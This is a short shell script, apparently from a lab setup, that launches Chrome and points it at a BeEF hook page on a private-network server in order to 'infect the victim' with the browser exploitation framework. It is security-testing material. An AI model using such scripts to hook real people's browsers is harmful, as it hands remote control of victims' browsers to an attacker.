####
#
#	This script is used to infect a victim with BEEF using Google Chrome.
#	If 'https' is given as first parameter, the browser opens the https-URL instead of using http
#
###

if [ "$1" = "https" ]
then
        nohup /cygdrive/c/Program\ Files/Google/Chrome/Application/chrome.exe https://172.16.151.119:3000/demos/basic.html &
        echo "infecting the victim with BEEF using HTTPS (Google Chrome).."
else
	nohup /cygdrive/c/Program\ Files/Google/Chrome/Application/chrome.exe 172.16.151.119:3000/demos/basic.html &
	echo "infecting the victim with BEEF (Google Chrome).."
fi
sleep 5
